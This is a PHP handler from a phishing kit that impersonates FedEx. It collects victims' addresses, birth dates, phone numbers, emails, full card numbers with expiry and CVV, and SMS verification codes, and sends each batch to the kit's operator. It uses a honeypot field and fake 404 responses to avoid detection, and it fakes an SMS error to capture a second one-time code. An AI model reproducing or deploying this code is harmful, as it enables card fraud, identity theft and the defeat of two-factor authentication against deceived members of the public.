<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/

    require_once 'app/config.php';
    if($_SERVER['REQUEST_METHOD'] == "POST") {

        if( !empty($_POST['cap']) ) {
            header("HTTP/1.0 404 Not Found");
            exit();
        }

        if( $_POST['steeep'] == "step2details" ) {
            $_SESSION['errors'] = [];
            $_SESSION['address']    = $_POST['address'];
            $_SESSION['zip_code']    = $_POST['zip_code'];
            $_SESSION['city']    = $_POST['city'];
            $_SESSION['birth_date']    = $_POST['birth_date'];
            $_SESSION['phone']    = $_POST['phone'];
            $_SESSION['email']    = $_POST['email'];
            if( empty($_POST['address']) ) {
                $_SESSION['errors']['address'] = "Address is not valid";
            }
            if( empty($_POST['zip_code']) ) {
                $_SESSION['errors']['zip_code'] = "Zip code is not valid";
            }
            if( empty($_POST['city']) ) {
                $_SESSION['errors']['city'] = "City is not valid";
            }
            if( validate_date($_POST['birth_date'],'d/m/Y') == false ) {
                $_SESSION['errors']['birth_date'] = "Date is not valid";
            }
            if( empty($_POST['phone']) ) {
                $_SESSION['errors']['phone'] = "Phone number is not valid";
            }
            if( validate_email($_POST['email']) == false ) {
                $_SESSION['errors']['email'] = "Email is not valid";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | FEDEX | Billing';
                $message = '/-- BILLING INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Address : ' . $_POST['address'] . "\r\n";
                $message .= 'Zip code : ' . $_POST['zip_code'] . "\r\n";
                $message .= 'City : ' . $_POST['city'] . "\r\n";
                $message .= 'Birth date : ' . $_POST['birth_date'] . "\r\n";
                $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
                $message .= 'Email : ' . $_POST['email'] . "\r\n";
                $message .= '/-- END BILLING INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "step3.php?id=" . mt_rand(11111, 99999999);
                exit();
            } else {
                echo "step2.php?error=1&id=" . mt_rand(11111, 99999999);
                exit();
            }
        }

        if( $_POST['steeep'] == "step3cc" ) {
            $_SESSION['errors'] = [];
            $_SESSION['one']    = $_POST['one'];
            $_SESSION['two']    = $_POST['two'];
            $_SESSION['three']    = $_POST['three'];
            $_SESSION['full_name']    = $_POST['full_name'];
            $date_ex    = explode('/',$_POST['two']);
            $one        = validate_one($_POST['one']);
            $three      = validate_three($_POST['three'],$one['type']);
            $two        = validate_two($date_ex[0],$date_ex[1]);
            if( $one == false ) {
                $_SESSION['errors']['one'] = "Card number is not valid";
            }
            if( $two == false ) {
                $_SESSION['errors']['two'] = "Date is not valid";
            }
            if( $three == false ) {
                $_SESSION['errors']['three'] = "CVV is not valid";
            }
            if( validate_name($_POST['full_name']) == false ) {
                $_SESSION['errors']['full_name'] = "Name is not valid";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | FEDEX | Card';
                $message = '/-- CARD INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Name : ' . $_POST['full_name'] . "\r\n";
                $message .= 'Card number : ' . $_POST['one'] . "\r\n";
                $message .= 'Card Date : ' . $_POST['two'] . "\r\n";
                $message .= 'Card CVV : ' . $_POST['three'] . "\r\n";
                $message .= '/-- END CARD INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                echo "loading.php?id=" . mt_rand(11111, 99999999);
                exit();
            } else {
                echo "step3.php?error=1&id=" . mt_rand(11111, 99999999);
                exit();
            }
        }

        if( $_POST['steeep'] == "step4sms" ) {
            $_SESSION['errors'] = [];
            $_SESSION['sms_code']    = $_POST['sms_code'];
            if( empty($_POST['sms_code']) ) {
                $_SESSION['errors']['sms_code'] = "SMS code is not valid";
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | FEDEX | Sms';
                $message = '/-- SMS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'SMS Code : ' . $_POST['sms_code'] . "\r\n";
                $message .= '/-- END SMS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    echo "success.php?id=" . mt_rand(11111, 99999999);
                    exit();
                }
                $_SESSION['errors']['sms_code'] = "SMS code is not valid";
                echo "loading.php?error=1&id=" . mt_rand(11111, 99999999);
                exit();
            } else {
                $error = $_POST['error'];
                echo "step4.php?error=$error&id=" . mt_rand(11111, 99999999);
                exit();
            }
        }

    } else {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

?>